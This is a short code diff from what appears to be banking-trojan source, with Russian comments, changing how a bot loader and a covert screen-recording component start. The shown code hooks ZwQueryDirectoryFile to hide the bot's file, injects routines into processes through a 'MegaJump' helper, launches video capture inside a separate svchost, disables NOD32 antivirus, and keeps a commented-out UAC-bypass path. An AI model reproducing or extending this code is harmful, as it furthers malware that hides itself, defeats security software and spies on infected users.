@@ -67,6 +67,27 @@ int FakeDllLenCryptKey = 0; //длина ключа шифрования тела бота
 //вычисляет хеш имяени файла в котором находится ботплаг, по этому хешу идет скрытие файла
 DWORD GetHashFileNameBotPlug();
 
+DWORD WINAPI LoaderRoutine(LPVOID Data);
+
+bool RunLoaderRoutine()
+{
+/*
+#ifdef UAC_bypassH
+	if( !RunBotBypassUAC(0) )
+		return MegaJump( LoaderRoutine );
+	return true;
+#else
+*/
+	return MegaJump( LoaderRoutine );
+//#endif
+}
+
+bool RunVideoProcess()
+{
+	DLLDBG( "Main", "Запуск видеодлл в отдельном свцхосте" );
+	return MegaJump( VideoProcess::StartSvchost );
+}
+
 DWORD WINAPI LoaderRoutine(LPVOID Data)
 {
 	BOT::Initialize(ProcessLoader);
@@ -115,10 +136,12 @@ DWORD WINAPI LoaderRoutine(LPVOID Data)
 	bool FirstSended = false;
 
 	#ifdef VideoRecorderH
-		if( VideoProcess::Start() )
-			DLLDBG( "Main", "Запустили видео процесс" );
-		else
-			DLLDBG( "Main", "ERROR: не запустился видео процесс" );
+		#ifndef VideoProcessSvchost
+			if( VideoProcess::Start() )
+				DLLDBG( "Main", "Запустили видео процесс" );
+			else
+				DLLDBG( "Main", "ERROR: не запустился видео процесс" );
+		#endif //VideoProcessSvchost
 	#endif
 
 	DLLDBG("====>Bot Loader", "Стартуем выполнение команд");
@@ -166,7 +189,11 @@ DWORD WINAPI ExplorerMain(LPVOID Data)
 	HookZwQueryDirectoryFile();
 
 	DLLDBG("====>Bot DLL", "Стартуем Loader ()");
-	MegaJump( LoaderRoutine );
+	RunLoaderRoutine();
+
+	#ifdef VideoProcessSvchost
+		RunVideoProcess();
+	#endif
 
 	DLLDBG( "Main", "Отключаем NOD32" );
 	OffNOD32();
